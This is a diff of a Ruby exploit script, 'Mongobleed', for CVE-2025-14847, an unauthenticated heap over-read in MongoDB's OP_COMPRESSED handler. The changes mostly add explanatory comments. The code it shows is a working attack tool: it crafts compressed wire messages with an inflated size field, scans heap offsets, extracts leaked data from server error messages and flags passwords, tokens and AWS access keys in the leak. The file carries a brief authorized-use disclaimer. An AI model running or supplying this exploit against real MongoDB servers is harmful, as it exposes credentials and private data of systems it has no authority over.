@@ -1,13 +1,45 @@
 #!/usr/bin/env ruby
 # frozen_string_literal: true
 
-# Mongobleed - CVE-2025-14847 MongoDB Memory Disclosure Exploit
+# ==============================================================================
+# Mongobleed: CVE-2025-14847 Exploit Implementation
+# ==============================================================================
 #
-# Exploits improper validation of uncompressed_size in MongoDB's OP_COMPRESSED handler,
-# causing buffer over-reads that leak heap memory through error messages.
+# Classification
+#   CVE:              CVE-2025-14847
+#   Type:             Heap Buffer Over-read
+#   Severity:         High
+#   Attack Vector:    Network, Unauthenticated
+#   Component:        MongoDB OP_COMPRESSED Handler
 #
-# Author: Demetrius Ford - github.com/demetriusford
-# Based on research by Joe Desimone
+# Vulnerability
+#   MongoDB's OP_COMPRESSED message handler (opcode 2012) fails to validate the
+#   uncompressed_size field against actual decompressed payload length. When a
+#   client provides an inflated uncompressed_size value, the BSON parser reads
+#   beyond the message boundary into heap memory. Error messages generated from
+#   malformed heap data leak memory contents as field names and type codes.
+#
+# Attack Flow
+#   1. Construct BSON document with controlled length field
+#   2. Wrap in OP_MSG and compress with zlib
+#   3. Wrap in OP_COMPRESSED with inflated uncompressed_size (actual + 500 bytes)
+#   4. Server decompresses into buffer, parser reads uncompressed_size bytes
+#   5. Parser hits invalid heap data, generates errors containing leaked memory
+#   6. Extract leaked data from error patterns: "field name 'X'" and "type N"
+#
+# Implementation
+#   Iterates through document lengths (min_offset to max_offset), each probing
+#   different heap offsets. Maintains 500-byte overflow to trigger over-read.
+#   Deduplicates results for display, preserves all bytes for analysis.
+#
+# Disclaimer
+#   For authorized security testing and research only. Users are responsible
+#   for obtaining proper authorization before use.
+#
+# Author
+#   Demetrius Ford (github.com/demetriusford)
+#   Based on research by Joe Desimone
+# ==============================================================================
 
 require "socket"
 require "zlib"
@@ -20,14 +52,17 @@ module CVE202514847
   class NetworkError < Error; end
   class DecompressionError < Error; end
 
+  # MongoDB's OP_COMPRESSED supports snappy, zlib, and zstd.
+  # Zlib (compressor_id=2) is used for universal compatibility.
   class Compressor
     def compress(data)
       Zlib::Deflate.deflate(data)
     end
   end
 
-  # Constructs BSON documents with inflated length fields to trigger over-reads
+  # Varying doc_len probes different heap offsets when combined with inflated buffer_size.
   class BSONBuilder
+    # Minimal valid BSON: type=0x10 (int32), field='a', null, value=1
     BSON_CONTENT = "\x10a\x00\x01\x00\x00\x00"
 
     def build(doc_len)
@@ -35,32 +70,34 @@ module CVE202514847
     end
   end
 
-  # Constructs MongoDB wire protocol messages (OP_MSG and OP_COMPRESSED)
   class WireProtocolBuilder
+    # OP_MSG format: flags (4 bytes) + kind (1 byte) + payload
     def build_op_msg(bson)
       [0].pack("L<") + "\x00".b + bson
     end
 
-    # Vulnerability: uncompressed_size (buffer_size) is not validated against actual decompressed size
+    # OP_COMPRESSED format: original_opcode (2013=OP_MSG) + uncompressed_size + compressor_id (2=zlib) + data
+    # The vulnerability: buffer_size (uncompressed_size) is trusted without validation,
+    # causing BSON parser to read beyond actual decompressed data into heap memory.
     def build_op_compressed(compressed_data:, buffer_size:)
-      [2013].pack("L<") +          # original_opcode: OP_MSG
-        [buffer_size].pack("l<") + # uncompressed_size: INFLATED VALUE
-        [2].pack("C") +            # compressor_id: zlib
+      [2013].pack("L<") +
+        [buffer_size].pack("l<") +
+        [2].pack("C") +
         compressed_data
     end
   end
 
-  # Constructs MongoDB wire protocol headers (16 bytes)
   class HeaderBuilder
     HEADER_SIZE = 16
     OPCODE_COMPRESSED = 2012
 
+    # Wire protocol header: length + requestID + responseID + opcode
     def build(payload_size)
       [HEADER_SIZE + payload_size, 1, 0, OPCODE_COMPRESSED].pack("L<L<L<L<")
     end
   end
 
-  # Orchestrates payload construction: BSON → OP_MSG → compress → OP_COMPRESSED → header
+  # Construction order: BSON → OP_MSG → compress → OP_COMPRESSED → header
   class PayloadBuilder
     def initialize(
       bson_builder:,
@@ -98,7 +135,7 @@ module CVE202514847
     end
   end
 
-  # Reads complete MongoDB messages using the message length field for framing
+  # MongoDB uses length-prefixed framing: first 4 bytes specify total message length.
   class SocketReader
     RECV_BUFFER_SIZE = 4096
 
@@ -150,9 +187,9 @@ module CVE202514847
     end
   end
 
-  # Decompresses MongoDB error responses containing leaked field names
+  # Leaked data surfaces in BSON parsing error messages after decompression.
   class ResponseDecompressor
-    MIN_RESPONSE_SIZE = 25
+    MIN_RESPONSE_SIZE = 25  # 16-byte header + 9-byte OP_COMPRESSED envelope minimum
     OPCODE_COMPRESSED = 2012
 
     def initialize(response)
@@ -165,6 +202,7 @@ module CVE202514847
       msg_len = @response[0..3].unpack1("L<")
 
       if compressed?
+        # Skip 16-byte header + 9-byte OP_COMPRESSED envelope
         Zlib::Inflate.inflate(@response[25...msg_len])
       else
         @response[16...msg_len]
@@ -180,11 +218,12 @@ module CVE202514847
     end
   end
 
-  # Extracts leaked data from MongoDB error messages via regex pattern matching
+  # When BSON parser reads beyond the buffer into heap memory, it generates errors
+  # containing "field name 'X'" and "type N" where X and N are leaked heap data.
   class LeakParser
     FIELD_NAME_PATTERN = /field name '([^']*)'/
     TYPE_PATTERN = /type (\d+)/
-    IGNORED_FIELDS = ["?", "a", "$db", "ping"].freeze
+    IGNORED_FIELDS = ["?", "a", "$db", "ping"].freeze  # Filter out our probe payload
 
     def initialize(raw_data)
       @raw_data = raw_data
@@ -211,7 +250,6 @@ module CVE202514847
     end
   end
 
-  # Accumulates and deduplicates leaked memory fragments across multiple probe offsets
   class ScanResults
     attr_reader :all_leaked, :unique_leaks
 
@@ -268,7 +306,6 @@ module CVE202514847
 
       offset_str = format("%04d", offset).cyan
       size_str = format("%4d bytes", data.bytesize).magenta
-      
       puts "#{"[+]".green} Offset #{offset_str} | Size: #{size_str} | #{preview}"
     end
 
@@ -308,9 +345,8 @@ module CVE202514847
     end
   end
 
-  # Detects common secret patterns in leaked memory (passwords, tokens, API keys)
   class SecretDetector
-    SECRET_PATTERNS = %w[password secret key token admin AKIA].freeze
+    SECRET_PATTERNS = %w[password secret key token admin AKIA].freeze  # AKIA = AWS access keys
 
     def initialize(data)
       @data = data
@@ -351,10 +387,10 @@ module CVE202514847
     end
   end
 
-  # Iterates through document length offsets with 500-byte overflow window
-  # to systematically scan heap memory at different locations
+  # Each doc_len probes a different heap offset. The 500-byte overflow causes
+  # BSON parser to read beyond the actual decompressed data into heap memory.
   class OffsetScanner
-    BUFFER_SIZE_OFFSET = 500
+    BUFFER_SIZE_OFFSET = 500 # Claim buffer is 500 bytes larger than actual
 
     def initialize(min_offset:, max_offset:, memory_probe:, leak_extractor:)
       @min_offset = min_offset
@@ -369,7 +405,6 @@ module CVE202514847
           doc_len: doc_len,
           buffer_size: doc_len + BUFFER_SIZE_OFFSET
         )
-        
         leaks = @leak_extractor.extract(response)
 
         leaks.each do |leak_data|
